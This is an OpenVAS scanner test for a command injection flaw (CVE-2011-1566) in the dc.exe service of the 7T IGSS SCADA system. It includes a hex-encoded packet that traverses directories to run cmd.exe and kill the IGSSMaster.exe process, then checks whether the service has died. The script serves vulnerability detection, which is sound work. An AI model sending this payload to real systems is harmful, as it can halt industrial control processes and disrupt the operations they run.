###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_igss_remote_command_exec_vuln_sep14.nasl 6735 2017-07-17 09:56:49Z teissa $
#
# 7T Interactive Graphical SCADA System 'dc.exe' Command Injection Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804768");
  script_version("$Revision: 6735 $");
  script_cve_id("CVE-2011-1566");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2017-07-17 11:56:49 +0200 (Mon, 17 Jul 2017) $");
  script_tag(name:"creation_date", value:"2014-09-25 16:14:02 +0530 (Thu, 25 Sep 2014)");


  script_name("7T Interactive Graphical SCADA System 'dc.exe' Command Injection Vulnerability");

  script_tag(name:"summary", value:"This host is installed with 7T Interactive
  Graphical SCADA System and is prone to remote command execution vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via and check
  whether it is able to execute the command remotely.");

  script_tag(name:"insight", value:"Flaw is due to dc.exe not properly sanitizing
  user input, specifically directory traversal style attacks (e.g., ../../)
  supplied via the 0xa and 0x17 opcodes.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to traverse directory and execute arbitrary commands.

  Impact Level: Application");

  script_tag(name:"affected", value:"Interactive Graphical SCADA System
  dc.exe <= 9.00.00.11059");

  script_tag(name:"solution", value:"Upgrade to version 9.00.00.11083 or higher,
  For updates refer www.igss.com");

  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17024");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/29129");
  script_xref(name : "URL" , value : "http://aluigi.altervista.org/adv/igss_8-adv.txt");
  script_xref(name : "URL" , value : "https://ics-cert.us-cert.gov/alerts/ICS-ALERT-11-080-03");

  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports(12397);
  exit(0);
}


## Variable Initialization
igssPort = 12397;

## Check Port status
if(!get_port_state(igssPort)){
  exit(0);
}

## Open the socket
soc = open_sock_tcp(igssPort);
if(!soc){
  exit(0);
}

## Constructed directory traversal crafted request
req = raw_string(
    0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x01, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x2e, 0x2e, 0x5c, 0x2e,
    0x2e, 0x5c, 0x2e, 0x2e, 0x5c, 0x2e, 0x2e, 0x5c,
    0x2e, 0x2e, 0x5c, 0x2e, 0x2e, 0x5c, 0x2e, 0x2e,
    0x5c, 0x2e, 0x2e, 0x5c, 0x2e, 0x2e, 0x5c, 0x2e,
    0x2e, 0x5c, 0x2e, 0x2e, 0x5c, 0x2e, 0x2e, 0x5c,
    0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x5c,
    0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x33, 0x32,
    0x5c, 0x63, 0x6d, 0x64, 0x2e, 0x65, 0x78, 0x65,
    0x22, 0x20, 0x2f, 0x63, 0x20, 0x74, 0x61, 0x73,
    0x6b, 0x6b, 0x69, 0x6c, 0x6c, 0x20, 0x2f, 0x49,
    0x4d, 0x20, 0x49, 0x47, 0x53, 0x53, 0x4d, 0x61,
    0x73, 0x74, 0x65, 0x72, 0x2e, 0x65, 0x78, 0x65,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00);

## send the attack request and receive the response
send(socket:soc, data:req);
res = recv(socket:soc, length:1024);
close(soc);

## Wait for some time
sleep(3);

## Check the port state
if(!get_port_state(igssPort))
{
  security_message(port:igssPort);
  exit(0);
}

## Check if it is possible to Open the socket
else if(!open_sock_tcp(igssPort))
{
  security_message(port:igssPort);
  exit(0);
}
